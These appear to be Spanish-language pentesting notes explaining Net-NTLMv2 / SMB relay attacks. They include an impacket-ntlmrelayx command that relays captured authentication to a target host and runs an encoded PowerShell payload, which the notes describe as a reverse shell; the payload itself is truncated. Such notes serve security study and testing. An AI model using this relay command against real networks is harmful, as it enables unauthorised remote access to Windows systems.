# Net-NTLMv2 / SMB Relay Attacks
- Este ataquee se basa en el uso de NTLMv2 para la autenticación de SMB, que es un protocolo de red utilizado para compartir archivos e impresoras en redes Windows. El ataque implica capturar el hash NTLMv2 y luego usarlo para autenticar a un usuario en otro sistema, lo que permite al atacante acceder a recursos protegidos sin necesidad de conocer la contraseña real del usuario.
- Sirve para cuando no somos capaces de crackear el hash NTLMv2, pero tenemos acceso a la red y podemos hacer un relay de la autenticación a otro sistema.

----

- [Más info](https://medium.com/@aniswersighni/active-directory-attacks-smb-relay-attacks-ea7d8cf9a8f8)
- [Fuente de Microsoft](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2008/ms08-068)

----

## NTLMv2 Relay con Impacket
- Utilizamos el script de impacket ntlmrelayx para realizar el ataque.
- Con la flag `--no-http-server` evitamos que el script levante un servidor HTTP, ya que no lo necesitamos.
- `impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..."`
    - `-smb2support` habilita el soporte para SMBv2, lo que puede ser necesario en algunas configuraciones de red.
- `-t` especifica el objetivo al que queremos enviar la autenticación.
- `-c` especifica el comando que queremos ejecutar en el objetivo.
    - `powershell -enc JABjAGwAaQBlAG4AdA...` es el comando que queremos ejecutar en el objetivo. En este caso, estamos utilizando PowerShell para ejecutar un comando codificado en Base64, en este caso una reverse shell